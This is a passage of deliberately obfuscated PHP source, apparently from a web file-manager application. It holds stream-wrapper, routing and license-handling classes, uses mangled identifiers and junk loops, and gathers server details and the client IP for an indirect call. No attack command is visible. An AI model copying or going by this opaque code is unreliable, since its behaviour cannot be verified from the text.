$Ò†ÌòÖÎ[12]; $ÚùŒã¸À = timeFloat(); $Ÿè¼‚æª = 15; for ($¥‘¿İÃ = 0; $¥‘¿İÃ < $”•»ÚÊß; $¥‘¿İÃ++) { if (timeFloat() - $ÚùŒã¸À > $Ÿè¼‚æª) { return !1; } $şŞã°â = $this->fileSubstr($Ş‚ÏáÉƒ, $³Óµô½¥ * $¥‘¿İÃ, $” Ä³»Œ); if (!$şŞã°â) { return !1; } $†§¾¸¤ .= $şŞã°â; } $†§¾¸¤ .= $this->fileSubstr($Ş‚ÏáÉƒ, $¿Ôæ™‡… - $” Ä³»Œ, $” Ä³»Œ); return md5($†§¾¸¤) . $¿Ôæ™‡…; } public function getContent($çÃ€ûà€) { return $this->fileSubstr($çÃ€ûà€); } public function fileSubstr($ñ§ùå¼, $†Îõ¨¿¤ = 0, $ÊòŸ¿Íœ = -1) { $ïö€€Œ¡ =& $_SERVER[áäÒ½¯Ç]; $èÈ†€ú· = $this->info($ñ§ùå¼); if (!$èÈ†€ú· || !$èÈ†€ú·[$ïö€€Œ¡[243]] && $èÈ†€ú·[$ïö€€Œ¡[79]] > 1024 * 1024 * 10) { return !1; } if ($ÊòŸ¿Íœ === -1) { $ÊòŸ¿Íœ = $èÈ†€ú·[$ïö€€Œ¡[79]]; } if ($ÊòŸ¿Íœ == 0) { return $ïö€€Œ¡[12]; } $È£›åæŒ = array($ïö€€Œ¡[1760] . $†Îõ¨¿¤ . $ïö€€Œ¡[892] . ($†Îõ¨¿¤ + $ÊòŸ¿Íœ - 1)); $ŠÏ„ğò = url_request($ñ§ùå¼, $ïö€€Œ¡[1555], !1, $È£›åæŒ, !1, !1, 30); return $ŠÏ„ğò[$ïö€€Œ¡[1339]] ? $ŠÏ„ğò[$ïö€€Œ¡[1339]] : $ïö€€Œ¡[12]; } public function download($Œú±‡¨À, $°Û¸Õ¼) { Downloader::start($Œú±‡¨À, $°Û¸Õ¼); return $°Û¸Õ¼; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ìı­©³, $÷ŒºÏ³ = '') { $this->info = $this->info($Ìı­©³); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[áäÒ½¯Ç][87]]; $this->pathOpen = $Ìı­©³; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ìı­©³])) { self::$_chunkBuffer[$Ìı­©³] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ß°¶¡¼©) { $ƒÍÕâş = $this->fileSubstr($this->pose, $ß°¶¡¼©); $this->pose += strlen($ƒÍÕâş); return $ƒÍÕâş; } public function stream_tell() { return $this->pose; } public function stream_seek($ˆÁèú, $â’’ª²ñ) { $ü¥õê¦Ò =& $_SERVER[áäÒ½¯Ç]; if ($â’’ª²ñ == SEEK_SET) { $this->pose = $ˆÁèú; } else { if ($â’’ª²ñ == SEEK_CUR) { $this->pose += $ˆÁèú; } else { if ($â’’ª²ñ == SEEK_END) { $this->pose = $this->info[$ü¥õê¦Ò[79]] + intval($ˆÁèú); } } } if ($ˆÁèú < 0) { $this->pose = $this->info[$ü¥õê¦Ò[79]] + $ˆÁèú; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[áäÒ½¯Ç][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ù½ººş—, $‡ÖÂÄĞ”) { $Ü’»É• =& $_SERVER[áäÒ½¯Ç]; $ø‘–Í˜ê = $this->info($Ù½ººş—); return array($Ü’»É•[1461] => 0, $Ü’»É•[1761] => 0, $Ü’»É•[16] => 32768 + 511, $Ü’»É•[1762] => 0, $Ü’»É•[1763] => 0, $Ü’»É•[1764] => 0, $Ü’»É•[1765] => 0, $Ü’»É•[79] => $ø‘–Í˜ê[$Ü’»É•[79]], $Ü’»É•[1766] => $ø‘–Í˜ê[$Ü’»É•[1611]], $Ü’»É•[1723] => $ø‘–Í˜ê[$Ü’»É•[88]], $Ü’»É•[1722] => $ø‘–Í˜ê[$Ü’»É•[242]], $Ü’»É•[1767] => 0, $Ü’»É•[1768] => 0); } static $fileInfo = array(); public function info($›¥÷‚Š«) { $™¾âóøÕ = $_SERVER[áäÒ½¯Ç][1769]; if (isset(self::$fileInfo[$›¥÷‚Š«])) { return self::$fileInfo[$›¥÷‚Š«]; } if (substr($›¥÷‚Š«, 0, strlen($™¾âóøÕ)) != $™¾âóøÕ) { return !1; } self::$fileInfo[$›¥÷‚Š«] = IO::info(substr($›¥÷‚Š«, strlen($™¾âóøÕ))); return self::$fileInfo[$›¥÷‚Š«]; } public static function read($ìÄø·ÌÒ, $Â‹îƒ£¶, $£Øğ•“è) { if (!isset(self::$_fopenCache[$ìÄø·ÌÒ])) { $Ÿó‘¾êù = new StreamWrapperIO(); $Ÿó‘¾êù->stream_open($ìÄø·ÌÒ); self::$_fopenCache[$ìÄø·ÌÒ] = $Ÿó‘¾êù; } $Ÿó‘¾êù = self::$_fopenCache[$ìÄø·ÌÒ]; return $Ÿó‘¾êù->fileSubstr($Â‹îƒ£¶, $£Øğ•“è); } public static function _read($Ã¤»Šş, $÷ıÜìÆ˜, $òæï˜„ê) { $¶‚ØÍñ€ =& $_SERVER[áäÒ½¯Ç]; $Ü–û®¯Ğ = fopen($Ã¤»Šş, $¶‚ØÍñ€[1615]); if (!$Ü–û®¯Ğ) { return $¶‚ØÍñ€[12]; } $âê¾§‡— = 8192; fseek($Ü–û®¯Ğ, $÷ıÜìÆ˜, SEEK_SET); $Í®ìëË— = $¶‚ØÍñ€[12]; $ú­Ã³’× = 0; while ($ú­Ã³’× < $òæï˜„ê) { $ó‰„à‚Ô = min($âê¾§‡—, $òæï˜„ê - $ú­Ã³’×); $Í®ìëË— .= fread($Ü–û®¯Ğ, $ó‰„à‚Ô); $ú­Ã³’× += $ó‰„à‚Ô; } fclose($Ü–û®¯Ğ); return $Í®ìëË—; } public function fileSubstr($¼ƒ¸ÆáÙ, $º¸®¤Ô›) { $âøÄ…” =& $_SERVER[áäÒ½¯Ç]; $“úˆÀæå = $this->info[$âøÄ…”[79]]; $ÎÑÛÆÎó = $¼ƒ¸ÆáÙ; $¥¬˜¹ = $º¸®¤Ô›; if ($¼ƒ¸ÆáÙ < 0) { $¼ƒ¸ÆáÙ = $“úˆÀæå + $¼ƒ¸ÆáÙ; } if ($º¸®¤Ô› === !1) { $º¸®¤Ô› = $“úˆÀæå - $¼ƒ¸ÆáÙ; } if ($¼ƒ¸ÆáÙ + $º¸®¤Ô› > $“úˆÀæå) { $º¸®¤Ô› = $“úˆÀæå - $¼ƒ¸ÆáÙ; } if ($º¸®¤Ô› <= 0) { return $âøÄ…”[12]; } if ($¼ƒ¸ÆáÙ < 0 || $¼ƒ¸ÆáÙ >= $“úˆÀæå || $º¸®¤Ô› <= 0 || $º¸®¤Ô› > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\x65\122\x65\x61\144\40\x65\162\x72\x6f\162\41\x20\163\x74\141\162\x74\x3d{$¼ƒ¸ÆáÙ}\x3b\x6c\x65\156\x67\x74\x68\x3d{$º¸®¤Ô›}\x3b\40\x73\x69\172\145\75{$“úˆÀæå}\73"); } $àËÌ¤÷† = 64 * 1024; $¢è»Ê€× =& self::$_chunkBuffer[$this->path]; if (!$¢è»Ê€×) { $¢è»Ê€× = array(); } $­‚ÂŞî“ = 0; $Àå±èêü = 0; $şª¨×© = $âøÄ…”[12]; foreach ($¢è»Ê€× as $­‚ÂŞî“ => $şª¨×©) { $­‚ÂŞî“ = intval($­‚ÂŞî“); $Àå±èêü = $­‚ÂŞî“ + strlen($şª¨×©); if ($¼ƒ¸ÆáÙ >= $Àå±èêü) { continue; } if ($¼ƒ¸ÆáÙ >= $­‚ÂŞî“ && $¼ƒ¸ÆáÙ + $º¸®¤Ô› <= $Àå±èêü) { return substr($şª¨×©, $¼ƒ¸ÆáÙ - $­‚ÂŞî“, $º¸®¤Ô›); } break; } if (count($¢è»Ê€×) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($âøÄ…”[1770], $âøÄ…”[1771] . count($¢è»Ê€×) . "\73\x73\x74\x61\x72\x74\75{$¼ƒ¸ÆáÙ}\54\x6c\145\x6e\147\164\x68\x3d{$º¸®¤Ô›}\73\160\x6f\x73\x65\72{$­‚ÂŞî“}\x7e{$Àå±èêü}"); throw new Exception($âøÄ…”[1772]); } $†ŞÆ©‚à = intval($¼ƒ¸ÆáÙ / $àËÌ¤÷†) * $àËÌ¤÷†; $õÊÕıĞÒ = ceil(($¼ƒ¸ÆáÙ + $º¸®¤Ô›) / $àËÌ¤÷†) * $àËÌ¤÷† - $†ŞÆ©‚à; $¹Ò½¬ = IO::fileSubstr($this->path, $†ŞÆ©‚à, $õÊÕıĞÒ); $¢è»Ê€×[$†ŞÆ©‚à . $âøÄ…”[12]] = $¹Ò½¬; ksort($¢è»Ê€×); $Æ£­ïÈ¦ = substr($¹Ò½¬, $¼ƒ¸ÆáÙ - $†ŞÆ©‚à, $º¸®¤Ô›); return $Æ£­ïÈ¦; } private function log($ı…Ö…Ô™, $¸µş‡ãÇ) { $÷¢âµâ† =& $_SERVER[áäÒ½¯Ç]; $›¾èªÅó = timeFloat() - $this->timeStart; write_log(sprintf($÷¢âµâ†[1773], $ı…Ö…Ô™, $this->info[$÷¢âµâ†[32]], $›¾èªÅó, $¸µş‡ãÇ), $÷¢âµâ†[1317]); } } class Message { function __construct() { } public function send($Ø½¿î…Ş = '', $®òÊ€Å¨ = array(), $—ïÊØÓ‚ = "\164\145\x78\x74") { $œ°“ïàö =& $_SERVER[áäÒ½¯Ç]; $—ÍÌÌÕå = array($œ°“ïàö[33] => $œ°“ïàö[1237], $œ°“ïàö[169] => $Ø½¿î…Ş); if (in_array($—ïÊØÓ‚, array($œ°“ïàö[1237], $œ°“ïàö[1774]))) { $—ÍÌÌÕå[$œ°“ïàö[33]] = $—ïÊØÓ‚; } $®òÊ€Å¨ = array($œ°“ïàö[603] => isset($®òÊ€Å¨[$œ°“ïàö[603]]) ? $®òÊ€Å¨[$œ°“ïàö[603]] : $œ°“ïàö[12], $œ°“ïàö[690] => isset($®òÊ€Å¨[$œ°“ïàö[690]]) ? $®òÊ€Å¨[$œ°“ïàö[690]] : $œ°“ïàö[12]); if (empty($Ø½¿î…Ş) || empty($®òÊ€Å¨[$œ°“ïàö[603]]) && empty($®òÊ€Å¨[$œ°“ïàö[690]])) { return !1; } $èÇ¦ÖÑÂ = array($œ°“ïàö[1703] => $—ÍÌÌÕå, $œ°“ïàö[1775] => $®òÊ€Å¨); Hook::trigger($œ°“ïàö[1776], $èÇ¦ÖÑÂ); } } goto f¸°õÑ¹Ò‘; AÀÀå°: while ($ztsuaoqmlh < $_SERVER[áäÒ½¯Ç][222]) { if ($ztsuaoqmlh >= 0) { break; } $ztsuaoqmlh++; } class Application { private $defaultModule = "\x69\156\144\x65\170"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($µüÌì»â) { $¯òÚ¡Œä =& $_SERVER[áäÒ½¯Ç]; $üä©¨„¥ =& $_SERVER[™Í‘Í£§]; $ù•Ø‘¥€ = explode($üä©¨„¥[0], trim($µüÌì»â, $üä©¨„¥[0])); $ÓÕÑ¬æ­ = $¯òÚ¡Œä[712]; if (strlen($ÓÕÑ¬æ­) < $¯òÚ¡Œä[708]) { die; } $this->defaultModule = $ù•Ø‘¥€[0] ? $ù•Ø‘¥€[0] : $this->defaultModule; $°‘ ÈşÅ = $¯òÚ¡Œä[713]; $this->defaultController = $ù•Ø‘¥€[1] ? $ù•Ø‘¥€[1] : $this->defaultController; $Ÿ×Åç¥ = $¯òÚ¡Œä[714]; while ($Ÿ×Åç¥ < $¯òÚ¡Œä[708]) { if ($Ÿ×Åç¥ >= 0) { break; } $Ÿ×Åç¥++; } $this->defaultAction = $ù•Ø‘¥€[2] ? $ù•Ø‘¥€[2] : $this->defaultAction; $this->raiy5a58b1e9($üä©¨„¥[1], array($this, $üä©¨„¥[2])); $°ª·ƒĞÈ = $¯òÚ¡Œä[715]; if (strlen($°ª·ƒĞÈ) < $¯òÚ¡Œä[716]) { die; } } public function appRun($ŸĞæ¯©À) { $Ò¡¿œµÌ =& $_SERVER[áäÒ½¯Ç]; $‚œ“¿‰ú =& $_SERVER[™Í‘Í£§]; $†ÖÃ«æ = explode($‚œ“¿‰ú[0], $ŸĞæ¯©À); $¢éÃæÈ = $Ò¡¿œµÌ[717]; if (strlen($¢éÃæÈ) < $Ò¡¿œµÌ[708]) { die; } $ßèĞÔúá = strtolower($†ÖÃ«æ[0]); $õñ˜¿ØÍ = $Ò¡¿œµÌ[718]; $¥íÎû”ñ = $‚œ“¿‰ú[3]; $®¡ªï = $Ò¡¿œµÌ[719]; if (strlen($®¡ªï) < $Ò¡¿œµÌ[716]) { die; } if ($ßèĞÔúá == $‚œ“¿‰ú[4]) { $¥íÎû”ñ = $‚œ“¿‰ú[5]; $†ÖÃ«æ[0] = $‚œ“¿‰ú[6]; $†ÖÃ«æ[1] = $†ÖÃ«æ[1] . $‚œ“¿‰ú[7]; $ŸĞæ¯©À = join($‚œ“¿‰ú[0], $†ÖÃ«æ); $ŸĞæ¯©À = trim($ŸĞæ¯©À, $‚œ“¿‰ú[0]); } call_user_func(array($‚œ“¿‰ú[8], $‚œ“¿‰ú[9]), $¥íÎû”ñ . $‚œ“¿‰ú[10], $ŸĞæ¯©À); ActionCall($ŸĞæ¯©À); call_user_func(array($‚œ“¿‰ú[8], $‚œ“¿‰ú[9]), $¥íÎû”ñ . $‚œ“¿‰ú[11], $ŸĞæ¯©À); } private function autorun() { $ã»ø€ôº =& $_SERVER[™Í‘Í£§]; global $config; $ƒğÅ¹Ø = $_SERVER[áäÒ½¯Ç][720]; if (count($config[$ã»ø€ôº[12]]) == 0) { return; } foreach ($config[$ã»ø€ôº[12]] as $’™ş¸¼¼ => $Œˆ¢âè€) { $this->appRun($Œˆ¢âè€); } } private function otzc787f829b() { $©å¯Æº =& $_SERVER[áäÒ½¯Ç]; $áü»ñ” =& $_SERVER[™Í‘Í£§]; $Åˆ¯Ò÷„ = $áü»ñ”[4]; $ÊÆµÉªÉ = $GLOBALS[$áü»ñ”[13]][$áü»ñ”[14]][0]; $À®ˆÚ• = $©å¯Æº[721]; if (!$À®ˆÚ•) { return; } if (!$ÊÆµÉªÉ || strlen($ÊÆµÉªÉ) <= strlen($Åˆ¯Ò÷„)) { return; } if (strtolower(substr($ÊÆµÉªÉ, -strlen($Åˆ¯Ò÷„))) != $Åˆ¯Ò÷„) { return; } $õ€î · = substr($ÊÆµÉªÉ, 0, -strlen($Åˆ¯Ò÷„)); $­Æ¾Ğ = array($áü»ñ”[4], $õ€î ·); $ûÚœñÔÈ = array_slice($GLOBALS[$áü»ñ”[13]][$áü»ñ”[14]], 1); $«í”­‘ = $©å¯Æº[722]; $GLOBALS[$áü»ñ”[13]][$áü»ñ”[14]] = array_merge($­Æ¾Ğ, $ûÚœñÔÈ); $GLOBALS[$áü»ñ”[13]][$áü»ñ”[15]] = implode($áü»ñ”[0], $GLOBALS[$áü»ñ”[13]][$áü»ñ”[14]]); } private function tymka111c766() { $ĞøÛ–œÑ =& $_SERVER[áäÒ½¯Ç]; $»æù´¤é =& $_SERVER[™Í‘Í£§]; if ($GLOBALS[$»æù´¤é[13]][$»æù´¤é[15]] != $»æù´¤é[6]) { return; } $Ã¥ø¯’» = $_SERVER[$»æù´¤é[16]]; $Šº¼ªù° = $ĞøÛ–œÑ[723]; if (strlen($Šº¼ªù°) < $ĞøÛ–œÑ[724]) { die; } $‚òğèæÅ = $»æù´¤é[17]; if (!strstr($Ã¥ø¯’», $‚òğèæÅ)) { return; } $‹¤ë£¬ñ = strrpos($Ã¥ø¯’», $‚òğèæÅ); $ú•—ëÜ£ = $ĞøÛ–œÑ[725]; if (strlen($ú•—ëÜ£) < $ĞøÛ–œÑ[708]) { return; } $¤Îú¾Ÿë = substr($Ã¥ø¯’», $‹¤ë£¬ñ + strlen($‚òğèæÅ)); preg_match_all($»æù´¤é[18], $¤Îú¾Ÿë, $¶¹‰† ä); $–ıÇ®” = $ĞøÛ–œÑ[726]; while ($–ıÇ®” < $ĞøÛ–œÑ[716]) { if ($–ıÇ®” >= 0) { break; } $–ıÇ®”++; } $¤Îú¾Ÿë = trim($¶¹‰† ä[0][0], $»æù´¤é[19]); $GLOBALS[$»æù´¤é[13]][$»æù´¤é[14]] = explode($»æù´¤é[19], $¤Îú¾Ÿë); $GLOBALS[$»æù´¤é[13]][$»æù´¤é[15]] = implode($»æù´¤é[0], $GLOBALS[$»æù´¤é[13]][$»æù´¤é[14]]); $ŞåŞè¯õ = $ĞøÛ–œÑ[727]; while ($ŞåŞè¯õ < $ĞøÛ–œÑ[728]) { if ($ŞåŞè¯õ >= 0) { break; } $ŞåŞè¯õ++; } } public function run() { $Å²»üõÏ =& $_SERVER[áäÒ½¯Ç]; $¼ñËƒé° =& $_SERVER[™Í‘Í£§]; $this->tymka111c766(); $ĞÍ‰·¸ù = $Å²»üõÏ[729]; $this->otzc787f829b(); $Ê«§ô = $GLOBALS[$¼ñËƒé°[13]][$¼ñËƒé°[14]]; $¥´ÆÚƒ = $Å²»üõÏ[730]; $§»†ñ¤ = $GLOBALS[$¼ñËƒé°[13]][$¼ñËƒé°[15]]; $â•Úè³ = $Å²»üõÏ[731]; while ($â•Úè³ < $Å²»üõÏ[716]) { if ($â•Úè³ >= 0) { break; } $â•Úè³++; } define($¼ñËƒé°[20], isset($Ê«§ô[0]) && $Ê«§ô[0] ? $Ê«§ô[0] : $this->defaultModule); $ ¿ŸãØ£ = $Å²»üõÏ[732]; if (strlen($ ¿ŸãØ£) < $Å²»üõÏ[222]) { die; } define($¼ñËƒé°[21], isset($Ê«§ô[1]) && $Ê«§ô[0] ? $Ê«§ô[1] : $this->defaultController); $¨à€Ëé¢ = $Å²»üõÏ[733]; if (strlen($¨à€Ëé¢) < $Å²»üõÏ[724]) { die; } define($¼ñËƒé°[22], isset($Ê«§ô[2]) && $Ê«§ô[0] ? $Ê«§ô[2] : $this->defaultAction); define($¼ñËƒé°[23], MOD . $¼ñËƒé°[0] . ST . $¼ñËƒé°[0] . ACT); $_SERVER[$¼ñËƒé°[24]] = strtolower(ACTION); $this->autorun(); if (count($Ê«§ô) >= 3) { $this->appRun($§»†ñ¤); } else { $this->appRun(ACTION); } } private $ifsx35ba79af = array(); private $zmdsfb0eb856 = ''; public function bkjf0d995654() { $Ÿ´Á‚Øã =& $_SERVER[áäÒ½¯Ç]; $—æŸò‡ =& $_SERVER[™Í‘Í£§]; $this->zrncb84cf185(); $this->ohrk1550b465(); $this->izwhf1500240(); $© ãóòÏ = $Ÿ´Á‚Øã[734]; if (!$© ãóòÏ) { return; } $this->yhbl28f44524(); $this->lshdc2951030(); $this->drtp593731ce(); $this->jrux666346a8(); $Á–é¹±‘ = $Ÿ´Á‚Øã[735]; if (strlen($Á–é¹±‘) < $Ÿ´Á‚Øã[724]) { die; } $this->raiy5a58b1e9($—æŸò‡[25], array($this, $—æŸò‡[26])); $´œÇÚéÖ = $Ÿ´Á‚Øã[736]; if (strlen($´œÇÚéÖ) < $Ÿ´Á‚Øã[708]) { return; } $this->raiy5a58b1e9($—æŸò‡[27], array($this, $—æŸò‡[28])); $this->raiy5a58b1e9($—æŸò‡[29], array($this, $—æŸò‡[30])); $this->raiy5a58b1e9($—æŸò‡[31], array($this, $—æŸò‡[32])); $£‡ŞÛÑ– = $Ÿ´Á‚Øã[737]; } public function getVersionData() { return $this->ifsx35ba79af; $é¼´Èï = $_SERVER[áäÒ½¯Ç][738]; } public function ixbk4b187a89($€¼‡–È­) { $ï±ÉõÊÀ =& $_SERVER[áäÒ½¯Ç]; $èş¸‹ª½ =& $_SERVER[™Í‘Í£§]; $‰“ùõ±Ü = Model($èş¸‹ª½[33])->get(); $ûšÚØğú = $ï±ÉõÊÀ[739]; if (strlen($ûšÚØğú) < $ï±ÉõÊÀ[716]) { die; } $” Ğù¶š = array($èş¸‹ª½[34], $èş¸‹ª½[35], $èş¸‹ª½[36], $èş¸‹ª½[37], $èş¸‹ª½[38], $èş¸‹ª½[39], $èş¸‹ª½[40], $èş¸‹ª½[41], $èş¸‹ª½[42], $èş¸‹ª½[43], $èş¸‹ª½[44], $èş¸‹ª½[45], $èş¸‹ª½[46], $èş¸‹ª½[47], $èş¸‹ª½[48], $èş¸‹ª½[49], $èş¸‹ª½[50], $èş¸‹ª½[51], $èş¸‹ª½[52], $èş¸‹ª½[53], $èş¸‹ª½[54], $èş¸‹ª½[55], $èş¸‹ª½[56], $èş¸‹ª½[57], $èş¸‹ª½[58], $èş¸‹ª½[59], $èş¸‹ª½[60], $èş¸‹ª½[61], $èş¸‹ª½[62], $èş¸‹ª½[63], $èş¸‹ª½[64], $èş¸‹ª½[65], $èş¸‹ª½[66], $èş¸‹ª½[67], $èş¸‹ª½[68], $èş¸‹ª½[69], $èş¸‹ª½[70], $èş¸‹ª½[71], $èş¸‹ª½[72], $èş¸‹ª½[73], $èş¸‹ª½[74], $èş¸‹ª½[75], $èş¸‹ª½[76], $èş¸‹ª½[77], $èş¸‹ª½[78], $èş¸‹ª½[79], $èş¸‹ª½[80], $èş¸‹ª½[81], $èş¸‹ª½[82], $èş¸‹ª½[83], $èş¸‹ª½[84], $èş¸‹ª½[85], $èş¸‹ª½[86], $èş¸‹ª½[87]); foreach ($” Ğù¶š as $·Ó´áú) { $ù×Á ÊÔ = $GLOBALS[$èş¸‹ª½[88]][$èş¸‹ª½[89]][$·Ó´áú]; if (isset($‰“ùõ±Ü[$·Ó´áú])) { $ù×Á ÊÔ = $‰“ùõ±Ü[$·Ó´áú]; } $€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[91]][$·Ó´áú] = $ù×Á ÊÔ; } $ôÚäÙ÷³ = $€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[91]][$èş¸‹ª½[46]]; $İÃ•”«ë = $ï±ÉõÊÀ[740]; while (strlen($İÃ•”«ë) < $ï±ÉõÊÀ[708]) { if (!$İÃ•”«ë) { break; } $İÃ•”«ë++; } unset($€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[92]][$èş¸‹ª½[93]]); $¢ÁŸª–Ş = $ï±ÉõÊÀ[741]; while ($¢ÁŸª–Ş < $ï±ÉõÊÀ[222]) { if ($¢ÁŸª–Ş >= 0) { break; } $¢ÁŸª–Ş++; } unset($€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[92]][$èş¸‹ª½[94]]); $Šº”ê‘ñ = $ï±ÉõÊÀ[742]; if (!$Šº”ê‘ñ) { die; } unset($€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[91]][$èş¸‹ª½[46]]); unset($€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[91]][$èş¸‹ª½[95]]); $ú·Å©ß = $ï±ÉõÊÀ[743]; if (strlen($ú·Å©ß) < $ï±ÉõÊÀ[728]) { die; } $€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[91]][$èş¸‹ª½[96]] = array($èş¸‹ª½[97] => (int) $ôÚäÙ÷³[$èş¸‹ª½[98]], $èş¸‹ª½[99] => (int) _get($ôÚäÙ÷³, $èş¸‹ª½[100], 0)); $Òê‡ØŒÄ = substr(md5($èş¸‹ª½[101] . get_client_ip() . $‰“ùõ±Ü[$èş¸‹ª½[102]]), 0, 15); $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[104]] = Mcrypt::encode(Session::sign(), $Òê‡ØŒÄ, 3600 * 24); $ã¥ª­»û = $ï±ÉõÊÀ[744]; if (strlen($ã¥ª­»û) < $ï±ÉõÊÀ[716]) { return; } $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[105]] = Action($èş¸‹ª½[106])->accessToken(); $½èÙ€İÛ = $ï±ÉõÊÀ[745]; if (strlen($½èÙ€İÛ) < $ï±ÉõÊÀ[724]) { die; } $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[107]] = md5($_SERVER[$èş¸‹ª½[108]] . $‰“ùõ±Ü[$èş¸‹ª½[102]]); $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[109]] = base64_encode(serverInfo()); $¹—‹ŒØ = $ï±ÉõÊÀ[746]; while ($¹—‹ŒØ < $ï±ÉõÊÀ[716]) { if ($¹—‹ŒØ >= 0) { break; } $¹—‹ŒØ++; } $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[110]] = $this->zmdsfb0eb856; if ($‰“ùõ±Ü[$èş¸‹ª½[110]] != $èş¸‹ª½[111]) { $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[112]] = $‰“ùõ±Ü[$èş¸‹ª½[112]]; $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[113]] = $‰“ùõ±Ü[$èş¸‹ª½[113]]; $ã¥ªöÃ– = rand_string(10) . $this->zmdsfb0eb856 . rand_string(5); $€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[114]][$èş¸‹ª½[115]] = $this->mpqwf1050b9c($ã¥ªöÃ–, $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[107]]); } if ($this->zmdsfb0eb856 == $èş¸‹ª½[111]) { $€¼‡–È­[$èş¸‹ª½[90]][$èş¸‹ª½[91]][$èş¸‹ª½[96]][$èş¸‹ª½[100]] = 0; } $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[116]] = $this->versionPluginFilter(); $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[117]] = _get($this->ifsx35ba79af, $èş¸‹ª½[118], $èş¸‹ª½[6]); $—ëĞù¢ = $ï±ÉõÊÀ[747]; if (!$—ëĞù¢) { return; } if (KodUser::isRoot() && $this->config[$èş¸‹ª½[119]]) { $€¼‡–È­[$èş¸‹ª½[103]][$èş¸‹ª½[120]] = WEB_ROOT; } return $€¼‡–È­; } private function drtp593731ce() { $æëšáäÜ =& $_SERVER[áäÒ½¯Ç]; $ê¢™ı–İ =& $_SERVER[™Í‘Í£§]; $ëîÏ¿÷ı = $_SERVER[$ê¢™ı–İ[24]] == $ê¢™ı–İ[121]; $à•ŞŞæ˜ = $æëšáäÜ[748]; while ($à•ŞŞæ˜ < $æëšáäÜ[728]) { if ($à•ŞŞæ˜ >= 0) { break; } $à•ŞŞæ˜++; } if ($_SERVER[$ê¢™ı–İ[24]] == $ê¢™ı–İ[122] && $_GET[$ê¢™ı–İ[123]] == $ê¢™ı–İ[124]) { $ëîÏ¿÷ı = !0; } if ($ëîÏ¿÷ı) { $Í‘±äè = array($ê¢™ı–İ[110] => $this->zmdsfb0eb856, $ê¢™ı–İ[125] => $this->prhi087703c4(), $ê¢™ı–İ[126] => Model($ê¢™ı–İ[127])->count()); if ($this->zmdsfb0eb856 != $ê¢™ı–İ[111]) { $İÆÅö«ü = _get($this->ifsx35ba79af, $ê¢™ı–İ[128]); if ($İÆÅö«ü) { $Í‘±äè[$ê¢™ı–İ[129]] = $İÆÅö«ü; $Í‘±äè[$ê¢™ı–İ[130]] = strtotime(_get($this->ifsx35ba79af, $ê¢™ı–İ[131])); $Í‘±äè[$ê¢™ı–İ[132]] = _get($this->ifsx35ba79af, $ê¢™ı–İ[118]); } $Ñ–åÎñş = Model($ê¢™ı–İ[33])->get($ê¢™ı–İ[133], $ê¢™ı–İ[6], !0); if (is_string($Ñ–åÎñş) && substr($Ñ–åÎñş, 0, 1) == $ê¢™ı–İ[134]) { $Ñ–åÎñş = json_decode_force($Ñ–åÎñş); } if (is_array($Ñ–åÎñş) && $Ñ–åÎñş[$ê¢™ı–İ[135]] && strstr($Ñ–åÎñş[$ê¢™ı–İ[135]], $ê¢™ı–İ[136])) { $Íë•šü» = explode($ê¢™ı–İ[136], $Ñ–åÎñş[$ê¢™ı–İ[135]]); $Í‘±äè[$ê¢™ı–İ[137]] = $Íë•šü»[0]; } } $Í‘±äè = $this->wgmbf37d1a59(json_encode($Í‘±äè), md5($ê¢™ı–İ[138])); $ÌŒòƒœ = $æëšáäÜ[749]; while ($ÌŒòƒœ < $æëšáäÜ[716]) { if ($ÌŒòƒœ >= 0) { break; } $ÌŒòƒœ++; } $‘‡İ™ÇÌ = array($ê¢™ı–İ[139] => $Í‘±äè); call_user_func(array($ê¢™ı–İ[140], $ê¢™ı–İ[141]), $‘‡İ™ÇÌ); } if ($this->zmdsfb0eb856 == $ê¢™ı–İ[111]) { return; } $³ºº÷°³ = array($ê¢™ı–İ[142], $ê¢™ı–İ[143], $ê¢™ı–İ[144], $ê¢™ı–İ[145], $ê¢™ı–İ[146], $ê¢™ı–İ[147]); $óÀ¶‰ß— = Model($ê¢™ı–İ[33])->get(); $‘‡İ™ÇÌ = array($ê¢™ı–İ[148] => $óÀ¶‰ß—[$ê¢™ı–İ[34]], $ê¢™ı–İ[149] => $óÀ¶‰ß—[$ê¢™ı–İ[35]], $ê¢™ı–İ[150] => $ê¢™ı–İ[6]); foreach ($³ºº÷°³ as $É²Œ”…) { if (!isset($óÀ¶‰ß—[$É²Œ”…]) || !$óÀ¶‰ß—[$É²Œ”…]) { continue; } $‘‡İ™ÇÌ[$É²Œ”…] = $óÀ¶‰ß—[$É²Œ”…]; $ºíŞš–— = $æëšáäÜ[750]; } call_user_func(array($ê¢™ı–İ[140], $ê¢™ı–İ[141]), 